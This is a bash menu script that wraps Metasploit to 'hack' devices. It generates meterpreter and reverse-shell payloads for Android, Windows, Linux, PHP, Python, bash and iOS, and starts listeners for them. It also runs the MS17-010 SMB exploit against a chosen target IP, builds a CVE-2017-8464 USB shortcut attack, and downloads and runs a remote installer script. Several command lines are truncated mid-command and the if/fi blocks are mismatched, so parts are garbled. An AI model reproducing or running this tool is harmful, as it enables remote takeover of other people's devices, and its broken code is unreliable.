#!/bin/bash


echo -e "'\033[92m'           1) install msf :)
             2) generate payload for android
             3) generate payload for windows
             4) generate payload for linux
             5) generate payload php for website
             6) listen to android payload
             7) listen to windows payload
             8) listen to linux payload
             9) listen to php payload
             10) generate url to hack android
             11) hack device port (445)
             12) generate payload python
             13) listen to python payload
             14) generate bash code
             15) listen to bash payload
             16) generate url to hack windows
             17) generate payload for hack windows with usb
             18) search on metasploit
             19) apple_ios (iphon) payload
             20) listen to apple_ios payload
             21) exit :)

             "
               read -p "+++++>" g
           if [ $g -eq 1 ]; then
             clear
            wget https://Auxilus.github.io/metasploit.sh
            cd metasploit
            bash metasploit.sh
            cd metasploit-framework
            gem install bundler -v 1.17.3
            bundle config build.nokogiri --use-system-libraries
            bundle install
            ./msfconsole
           fi
           if [ $g -eq 2 ]; then
            echo "android payload
            "
            read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            read -p "enter the payload name => " name
            cd payloads
             msfvenom -p android/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o ${name}.apk
             clear
             echo "<===========enter the payloads file to find your payload===========>"
             sleep 6
             clear
             cd ..
             bash meta.sh
           fi
           if [ $g -eq 3 ]; then
            echo "windows payload
            "
              read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            read -p "enter the payload name => " name
            cd payloads
             msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o ${name}.exe
             clear
             echo "<===========enter the payloads file to find your payload===========>"
             sleep 6
             clear
             cd ..
             bash meta.sh
           fi
           if [ $g -eq 4 ]; then
            echo "linux payload
            "
              read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            read -p "enter the payload name => " name
            cd payloads
             msfvenom -p python/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o ${name}.py
             clear
             echo "<===========enter the payloads file to find your payload===========>"
             sleep 6
             clear
             cd ..
             bash meta.sh
           fi
           if [ $g -eq 5 ]; then
             echo "php payload
             "
              read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            read -p "enter the payload name => " name
            cd payloads
             msfvenom -p php/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o ${name}.php
             clear
             echo "<===========enter the payloads file to find your payload===========>"
             sleep 6
             clear
             cd ..
             bash meta.sh
           fi
           if [ $g -eq 6 ]; then
             echo "listen to android payload
             "
             read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST $
           fi
           if [ $g -eq 7 ]; then
            echo "windows listener"
             read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set LHOST $
           fi
           if [ $g -eq 8 ]; then
            echo "linux listener"
             read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set LHOST '$
           fi
           if [[ $g -eq 9 ]]; then
            echo "php listener"
             read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload php/meterpreter/reverse_tcp' -x 'set LHOST '$LH$
           fi
           if [[ $g -eq 10 ]]; then
            echo "url to hack android
            "
             read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_http' -x 'set LHOST$
           fi
           if [[ $g -eq 11 ]]; then
            echo "hack with port (445)"
             read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
             read -p 'enter the target ip : ' ip
             msfconsole -x 'use exploit/windows/smb/ms17_010_psexec' -x 'set RHOST '$ip -x 'set LHOST '$LHOST -x 'set$
           fi
           if [[ $g -eq 12 ]]; then
                   read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            read -p "enter the payload name => " name
            cd payloads
             msfvenom -p python/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o ${name}.py
             clear
             echo "<===========enter the payloads file to find your payload===========>"
             sleep 6
             clear
             cd ..
             bash meta.sh
           if [[ $g -eq 13 ]]; then
                echo "listen to python payload
                "
             read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set LHOST '$
           fi
           fi
           if [[ $g -eq 14 ]]; then
                echo "generate bash payload
                "
            read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            read -p "enter the payload name => " name
            cd payloads
             msfvenom -p cmd/unix/reverse_bash LHOST=${LHOST} LPORT=${LPORT} -o ${name}.sh
             clear
             echo "<===========enter the payloads file to find your payload===========>"
             sleep 6
             clear
             cd ..
             bash meta.sh
           fi
           if [[ $g -eq 15 ]]; then
                 echo "listen to bash payload
                 "
             read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload cmd/unix/reverse_bash' -x 'set LHOST '$LHOST -x$
           fi
           if [[ $g -eq 16 ]]; then
                 echo "generate url to hack windows
                  "
                 read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_http' -x 'set LHOST$
           fi
           if [[ $g -eq 17 ]]; then
                echo "payload for hack with usb (windows)
                "
                 read -p "enter LHOST => " LHOST
             read -p "enter LPORT => " LPORT
             msfconsole -x 'use exploit/windows/fileformat/cve_2017_8464_lnk_rce' -x 'set payload windows/meterpreter$
           fi
           if [[ $g -eq 18 ]]; then
                read -p "what do you search +++++> " sea
                msfconsole -x 'search '$sea
           fi
           if [[ $g -eq 19 ]]; then
                cd payloads
                read -p "LHOST===> " LHOST
                read -p "LPORT===> " LPORT
                read -p "payload name===> " name
           msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o ${name}.api
           clear
           echo "<===========enter the payloads file to find your payload===========>"
           sleep 6
           clear
           cd ..
           bash meta.sh
           fi
           if [[ $g -eq 20 ]]; then
                echo "listen to apple_ios payload"
                read -p "enter LHOST => " LHOST
            read -p "enter LPORT => " LPORT
            msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x '$
            if [[ $g -eq 21 ]]; then
                echo "good bay :)"
                echo -e $e""
            fi
